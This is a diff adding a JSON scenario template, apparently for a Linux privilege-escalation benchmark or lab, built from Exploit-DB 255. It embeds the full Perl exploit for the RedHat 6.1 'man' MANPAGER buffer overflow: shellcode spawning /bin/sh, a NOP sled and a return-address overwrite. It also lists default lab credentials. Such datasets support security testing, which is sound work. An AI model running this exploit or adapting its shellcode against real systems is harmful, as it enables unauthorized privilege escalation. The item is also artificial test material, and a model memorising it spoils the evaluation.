@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_255",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: RedHat 6.1 - 'man' Local Overflow / Local Privilege Escalation (OSVDB-1233;CVE-2000-0170)\n\nExploit source code (255.pl):\n```\n#!/usr/bin/perl\n\n##  Redhat 6.1 man exploit - gives egid 15\n##  Written just for fun - teleh0r@doglover.com\n\n\n$shellcode =  \"\\xeb\\x1f\\x5f\\x89\\xfc\\x66\\xf7\\xd4\\x31\\xc0\\x8a\\x07\".\n              \"\\x47\\x57\\xae\\x75\\xfd\\x88\\x67\\xff\\x48\\x75\\xf6\\x5b\".\n              \"\\x53\\x50\\x5a\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xe8\\xdc\\xff\".\n              \"\\xff\\xff\\x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x01\";\n\n\n$len = 4062;        # -- Sufficient to overwrite EIP.\n$nop = \"\\x90\";      # -- x86 NOP.\n$ret = 0xbfffbb24;  # -- ESP / Return value.\n$offset = -800;     # -- Default offset to try.\n\n\nif (@ARGV == 1) {\n    $offset = $ARGV[0];\n}\n\nfor ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {\n    $buffer .= $nop;\n}\n\n# [ Buffer: NNNNNNNNNNNNNN ]\n\n# Add the shellcode to the buffer.\n\n$buffer .= $shellcode;\n\n# [ Buffer: NNNNNNNNNNNNNNSSSSS ]\n\n$address = sprintf('%lx', ($ret + $offset));\n$new_ret = pack('l', ($ret + $offset));\n\nprint(\"Address: 0x$address / Offset: $offset\\n\");\nsleep(1);\n\n# Fill the rest of the buffer (length 100) with RET's.\n\nfor ($i += length($shellcode); $i < $len; $i += 4) {\n    $buffer .= $new_ret;\n}\n\n# [ Buffer: NNNNNNNNNNNNNNNNSSSSSRRRRRR ]\n\nlocal($ENV{'MANPAGER'}) = $buffer; exec(\"/usr/bin/man id\");\n\n\n# milw0rm.com [2001-01-19]\n```",
+  "cve": "OSVDB-1233;CVE-2000-0170",
+  "exploitdb_id": "255",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_255",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
